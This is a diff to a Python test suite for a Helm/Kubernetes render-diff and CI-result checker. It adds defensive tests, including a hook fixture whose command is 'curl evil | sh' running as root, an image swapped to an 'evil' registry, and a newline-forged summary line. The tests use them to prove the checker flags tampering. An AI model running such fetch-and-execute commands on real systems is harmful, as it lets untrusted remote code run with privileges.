@@ -38,6 +38,7 @@ WHAT IS ASSERTED, each with a red case:
 from __future__ import annotations
 
 import copy
+import datetime as dt
 import io
 import json
 import os
@@ -543,6 +544,121 @@ def test_a_target_equal_to_the_pin_has_an_empty_head_diff(repo: Path) -> None:
     assert result["objects"] == []
 
 
+# ── 4b. the head render against the base render, hooks included ─────────────
+# Review [HIGH] 3: the head was only a subset of live, so a removed field, a
+# changed hook and a steady object turned into a hook all went green.
+
+
+def head_with(change) -> list:
+    documents = head_documents()
+    change(documents)
+    return documents
+
+
+def judged(repo: Path, head: list) -> dict:
+    sha = pin_branch(repo, table_docs=head)
+    return run(repo, sha, render=Render({PIN: base_documents(), TARGET: head}))
+
+
+def test_a_field_removed_at_head_is_red(repo: Path) -> None:
+    def drop(documents: list) -> None:
+        pod = by_kind_name(documents, "Deployment", "gateway")["spec"]["template"]["spec"]
+        del pod["securityContext"]
+        del pod["containers"][0]["securityContext"]
+
+    result = judged(repo, head_with(drop))
+    assert result["result"] == "red"
+    assert any("render diff" in p and "apps/Deployment//gateway spec.template.spec.securityContext" in p for p in result["problems"])
+    assert any("spec.template.spec.containers[0].securityContext" in p for p in result["problems"]), result["problems"]
+
+
+def test_a_mutated_hook_is_red(repo: Path) -> None:
+    def mutate(documents: list) -> None:
+        hook = by_kind_name(documents, "Job", "preflight")["spec"]["template"]["spec"]
+        hook["containers"][0]["command"] = ["sh", "-c", "curl evil | sh"]
+        hook["securityContext"] = {"runAsUser": 0}
+        hook["serviceAccountName"] = "default"
+
+    result = judged(repo, head_with(mutate))
+    assert result["result"] == "red"
+    for path in ("containers[0].command", "securityContext", "serviceAccountName"):
+        assert any("batch/Job//preflight" in p and path in p for p in result["problems"]), (path, result["problems"])
+
+
+def test_a_hook_image_moving_alone_stays_inside_the_image_rule(repo: Path) -> None:
+    def move(documents: list) -> None:
+        hook = by_kind_name(documents, "Job", "preflight")["spec"]["template"]["spec"]
+        hook["containers"][0]["image"] = "ghcr.io/yadgarhq/preflight:0.1.1@sha256:" + "4" * 64
+
+    result = judged(repo, head_with(move))
+    assert result["result"] == "green", result["problems"]
+
+
+def test_a_steady_object_flipped_to_a_hook_is_red(repo: Path) -> None:
+    def flip(documents: list) -> None:
+        nats = by_kind_name(documents, "StatefulSet", "nats")
+        nats["metadata"]["annotations"] = {"helm.sh/hook": "post-install"}
+        nats["spec"]["replicas"] = 0
+
+    result = judged(repo, head_with(flip))
+    assert result["result"] == "red"
+    assert any("apps/StatefulSet//nats" in p and "hook" in p for p in result["problems"]), result["problems"]
+    assert any("apps/StatefulSet//nats spec.replicas" in p for p in result["problems"]), result["problems"]
+
+
+def test_an_image_whose_repository_moves_is_red(repo: Path) -> None:
+    def elsewhere(documents: list) -> None:
+        container = by_kind_name(documents, "Deployment", "gateway")["spec"]["template"]["spec"]["containers"][0]
+        container["image"] = "docker.io/evil/gw:latest"
+
+    result = judged(repo, head_with(elsewhere))
+    assert result["result"] == "red"
+    assert any("repository" in p and "containers[0].image" in p for p in result["problems"]), result["problems"]
+
+
+def test_the_image_rule_is_anchored() -> None:
+    assert pin_dryrun.IMAGE_PATH.fullmatch("spec.template.spec.containers[0].image")
+    for path in ("x.spec.template.spec.containers[0].image", "spec.template.spec.containers[0].image.x", "spec.template.spec.initContainers[0].image"):
+        assert not pin_dryrun.IMAGE_PATH.fullmatch(path)
+
+
+def test_a_downgrade_is_refused(repo: Path) -> None:
+    result = run(repo, pin_branch(repo, target="0.25.14", table_docs=base_documents()), kubectl=NoCluster())
+    assert result["result"] == "refused"
+    assert any("lower than" in p for p in result["problems"]), result["problems"]
+
+
+def test_a_criss_cross_history_with_two_merge_bases_is_refused(repo: Path) -> None:
+    root = main_sha(repo)
+    git(repo, "checkout", "-q", "-b", "a", root)
+    write(repo, "README.md", "a\n")
+    a1 = commit(repo, "a1")
+    git(repo, "checkout", "-q", "-b", "b", root)
+    write(repo, "LICENSE", "b\n")
+    b1 = commit(repo, "b1")
+    git(repo, "checkout", "-q", "a")
+    git(repo, "merge", "-q", "--no-ff", "-m", "a2", b1)
+    git(repo, "checkout", "-q", "b")
+    git(repo, "merge", "-q", "--no-ff", "-m", "b2", a1)
+    b2 = git(repo, "rev-parse", "HEAD")
+    a2 = git(repo, "rev-parse", "a")
+    git(repo, "checkout", "-q", "main")
+    result = run(repo, b2, base=a2, kubectl=NoCluster())
+    assert result["result"] == "refused"
+    assert any("merge base" in p for p in result["problems"]), result["problems"]
+
+
+def test_the_summary_prints_paths_with_repr_so_a_newline_cannot_forge_a_line(capsys) -> None:
+    forged = "data.a\n## pin-dryrun: green"
+    result = {
+        "result": "red", "sha": "c" * 40, "pin": PIN, "target": TARGET, "compared": 1, "admission": {},
+        "objects": [{"key": "/ConfigMap//x", "paths": [forged]}],
+        "problems": [f"/ConfigMap//x {forged}"],
+    }  # fmt: skip
+    pin_dryrun._summary(result)
+    assert "\n## pin-dryrun: green" not in capsys.readouterr().out
+
+
 # ── 5. output, kubectl and failures ─────────────────────────────────────────
 
 
@@ -606,13 +722,17 @@ def test_the_cli_refuses_a_short_sha() -> None:
     assert pin_dryrun.main(["run", "--repo", ".", "--main-sha", "abc", "--sha", "a" * 40, "--context", CONTEXT, "--out", "x"]) == 2
 
 
-# ── 6. find: the reader, unforgeable ────────────────────────────────────────
+# ── 6. find: the reader, unforgeable and bound to the run ───────────────────
 
 REPO = "yadgarhq/argocd-verify"
 OWN_ID = 4242
 PATH = ".github/workflows/pin-dryrun.yaml"
 WANTED = "f" * 40
 HEAD = "9" * 40
+BRANCH_HEAD = "8" * 40
+MAIN_SHA = "a" * 40
+NOW = dt.datetime(2026, 10, 19, 10, 0, tzinfo=dt.timezone.utc)
+FRESH = "2026-10-19T09:55:00Z"
 
 
 def archive(result: dict) -> bytes:
@@ -623,16 +743,25 @@ def archive(result: dict) -> bytes:
 
 
 class FakeGitHub:
+    """Branch `main`'s head is BRANCH_HEAD. A TAG named `main` also exists: `compare/main...X` (by name)
+    answers `behind` for anything, as git resolves `refs/tags/main` first. Only `compare/BRANCH_HEAD...X`
+    tells the truth."""
+
     def __init__(self) -> None:
-        self.paths: dict[str, object] = {f"/repos/{REPO}": {"id": OWN_ID, "default_branch": "main"}}
+        self.paths: dict[str, object] = {
+            f"/repos/{REPO}": {"id": OWN_ID, "default_branch": "main"},
+            f"/repos/{REPO}/branches/main": {"name": "main", "commit": {"sha": BRANCH_HEAD}},
+        }
         self.downloads: dict[str, bytes] = {}
         self.artifacts: list[dict] = []
         self.reachable: set[str] = {HEAD}
+        self.seen: list[str] = []
 
-    def add(self, run_id: int, *, created: str, result: str = "green", sha: str = WANTED, **run_overrides) -> None:
+    def add(self, run_id: int, *, created: str, result: str = "green", sha: str = WANTED, record=None, **run_overrides) -> None:
         run = {
             "id": run_id,
             "status": "completed",
+            "conclusion": "success" if result == "green" else "failure",
             "event": "workflow_dispatch",
             "head_branch": "main",
             "head_sha": HEAD,
@@ -643,7 +772,9 @@ class FakeGitHub:
         run.update(run_overrides)
         self.paths[f"/repos/{REPO}/actions/runs/{run_id}"] = run
         url = f"https://api.github.com/artifacts/{run_id}/zip"
-        self.downloads[url] = archive({"sha": sha, "result": result, "objects": []})
+        body = {"sha": sha, "result": result, "main_sha": MAIN_SHA, "pin": PIN, "read_at": FRESH, "objects": []}
+        body.update(record or {})
+        self.downloads[url] = archive({k: v for k, v in body.items() if v is not None})
         self.artifacts.append(
             {
                 "id": run_id * 10,
@@ -656,12 +787,14 @@ class FakeGitHub:
         )
 
     def get(self, path: str):
+        self.seen.append(path)
         if path.startswith(f"/repos/{REPO}/actions/artifacts?"):
             assert "name=pin-dryrun" in path
-            return {"artifacts": self.artifacts if "page=1" in path else []}
+            return {"artifacts": self.artifacts if path.endswith("&page=1") else []}
         if path.startswith(f"/repos/{REPO}/compare/main..."):
-            sha = path.rsplit("...", 1)[1]
-            if sha in self.reachable:
+            return {"status": "behind"}  # the tag named `main`
+        if path.startswith(f"/repos/{REPO}/compare/{BRANCH_HEAD}..."):
+            if path.rsplit("...", 1)[1] in self.reachable:
                 return {"status": "behind"}
             raise pin_dryrun.NotFound(path)
         if path in self.paths:
@@ -672,8 +805,8 @@ class FakeGitHub:
         return self.downloads[url]
 
 
-def find(github: FakeGitHub) -> dict | None:
-    return pin_dryrun.find(github, REPO, PATH, WANTED)
+def find(github: FakeGitHub, *, main_sha: str = MAIN_SHA, pin: str = PIN, now: dt.datetime = NOW) -> dict | None:
+    return pin_dryrun.find(github, REPO, PATH, WANTED, main_sha=main_sha, pin=pin, now=now)
 
 
 def test_find_takes_the_newest_result_for_the_sha() -> None:
@@ -681,14 +814,62 @@ def test_find_takes_the_newest_result_for_the_sha() -> None:
     github.add(1, created="2026-10-19T08:00:00Z", result="red")
     github.add(2, created="2026-10-19T09:00:00Z", result="green")
     found = find(github)
-    assert found is not None and found["run_id"] == 2 and found["result"]["result"] == "green"
+    assert found is not None and found["run_id"] == 2 and found["verdict"] == "green"
 
 
 def test_find_lets_a_newer_red_win_over_an_older_green() -> None:
     github = FakeGitHub()
     github.add(1, created="2026-10-19T08:00:00Z", result="green")
     github.add(2, created="2026-10-19T09:00:00Z", result="red")
-    assert find(github)["result"]["result"] == "red"
+    assert find(github)["verdict"] == "red"
+
+
+def test_find_answers_pending_while_the_newest_run_has_not_completed() -> None:
+    # Review [HIGH] 1a: the red run uploaded its artifact and fails its last step later.
+    github = FakeGitHub()
+    github.add(1, created="2026-10-19T08:00:00Z", result="green")
+    github.add(2, created="2026-10-19T09:00:00Z", result="red", status="in_progress", conclusion=None)
+    found = find(github)
+    assert found["run_id"] == 2 and found["verdict"] == "pending"
+
+
+@pytest.mark.parametrize("conclusion", ["failure", "cancelled", "timed_out", None])
+def test_find_never_calls_green_a_run_that_did_not_succeed(conclusion) -> None:
+    # Review [HIGH] 1b.
+    github = FakeGitHub()
+    github.add(1, created="2026-10-19T09:00:00Z", result="green", conclusion=conclusion)
+    found = find(github)
+    assert found["verdict"] != "green" and "conclusion" in found["reason"]
+
+
+@pytest.mark.parametrize(
+    "record",
+    [
+        {"main_sha": None},  # a result that names no main
+        {"main_sha": "b" * 40},  # judged against another main
+        {"pin": "0.25.14"},  # judged against another pin
+        {"read_at": None},
+        {"read_at": "2026-07-21T08:00:00Z"},  # a green 90 days old
+        {"read_at": "2026-10-19T08:59:59Z"},  # one second past the window
+        {"read_at": "2026-10-19T11:00:00Z"},  # from the future
+    ],
+)
+def test_find_calls_a_result_bound_to_another_main_pin_or_time_stale(record: dict) -> None:
+    # Review [HIGH] 1c.
+    github = FakeGitHub()
+    github.add(1, created="2026-10-19T09:00:00Z", result="green", record=record)
+    assert find(github)["verdict"] == "stale"
+
+
+def test_the_freshness_window_is_named_and_bounded() -> None:
+    assert 0 < pin_dryrun.FRESH_SECONDS <= 3600
+
+
+def test_find_does_not_fall_back_to_an_older_green_behind_a_stale_newest() -> None:
+    github = FakeGitHub()
+    github.add(1, created="2026-10-19T08:00:00Z", result="green")
+    github.add(2, created="2026-10-19T09:00:00Z", result="green", record={"main_sha": "b" * 40})
+    assert find(github)["verdict"] == "stale"
 
 
 @pytest.mark.parametrize(
@@ -701,7 +882,6 @@ def test_find_lets_a_newer_red_win_over_an_older_green() -> None:
         {"head_branch": "feature"},
         {"head_repository": {"id": 1}},
         {"repository": {"id": 1}},
-        {"status": "in_progress"},
         # A TAG NAMED `main` (argocd#111 S1): head_branch reads "main", the
         # tag's copy of the workflow ran, and its head_sha is on no branch.
         {"head_sha": "7" * 40},
@@ -711,6 +891,15 @@ def test_find_ignores_a_forgeable_run(overrides: dict) -> None:
     github = FakeGitHub()
     github.add(1, created="2026-10-19T08:00:00Z", result="green", **overrides)
     assert find(github) is None
+
+
+def test_find_compares_against_the_branch_head_sha_never_the_bare_name() -> None:
+    # Review [MED] 2: a tag and a branch both named `main`; `compare/main...X` resolves the tag.
+    github = FakeGitHub()
+    github.add(1, created="2026-10-19T08:00:00Z", result="green", head_sha="7" * 40)
+    assert find(github) is None
+    assert not any("/compare/main..." in path for path in github.seen)
+    assert f"/repos/{REPO}/branches/main" in github.seen
 
 
 def test_find_ignores_an_expired_artifact_and_another_shas_result() -> None:
@@ -723,29 +912,30 @@ def test_find_ignores_an_expired_artifact_and_another_shas_result() -> None:
 
 def test_find_never_reads_commits_of_a_sha() -> None:
     github = FakeGitHub()
-    seen: list[str] = []
-    original = github.get
-
-    def get(path: str):
-        seen.append(path)
-        return original(path)
-
-    github.get = get
     github.add(1, created="2026-10-19T08:00:00Z")
     find(github)
-    assert not any("/commits/" in p for p in seen)
+    assert not any("/commits/" in p for p in github.seen)
 
 
-def test_the_find_cli_exits_0_only_on_green(tmp_path: Path) -> None:
+def test_the_find_cli_exits_0_only_on_a_fresh_green_bound_to_main(tmp_path: Path) -> None:
     github = FakeGitHub()
     github.add(1, created="2026-10-19T08:00:00Z", result="red")
     out = tmp_path / "found.json"
-    assert pin_dryrun.main(["find", "--sha", WANTED, "--out", str(out)], github=github) == 1
-    assert json.loads(out.read_text())["result"]["result"] == "red"
+    argv = ["find", "--sha", WANTED, "--main-sha", MAIN_SHA, "--pin", PIN, "--out", str(out)]
+    assert pin_dryrun.main(argv, github=github, now=NOW) == 1
+    assert json.loads(out.read_text())["verdict"] == "red"
     github.add(2, created="2026-10-19T09:00:00Z", result="green")
-    assert pin_dryrun.main(["find", "--sha", WANTED, "--out", str(out)], github=github) == 0
-    assert pin_dryrun.main(["find", "--sha", "1" * 40, "--out", str(out)], github=github) == 1
+    assert pin_dryrun.main(argv, github=github, now=NOW) == 0
+    stale = ["find", "--sha", WANTED, "--main-sha", MAIN_SHA, "--pin", "0.25.14", "--out", str(out)]
+    assert pin_dryrun.main(stale, github=github, now=NOW) == 1
+    assert json.loads(out.read_text())["verdict"] == "stale"
+    other = ["find", "--sha", "1" * 40, "--main-sha", MAIN_SHA, "--pin", PIN, "--out", str(out)]
+    assert pin_dryrun.main(other, github=github, now=NOW) == 1
     assert json.loads(out.read_text()) == {"found": False}
+
+
+def test_the_find_cli_requires_main_sha_and_pin(tmp_path: Path) -> None:
+    assert pin_dryrun.main(["find", "--sha", WANTED, "--out", str(tmp_path / "x")], github=FakeGitHub(), now=NOW) == 2
 
 
 # ── 7. the reader imports without PyYAML ────────────────────────────────────
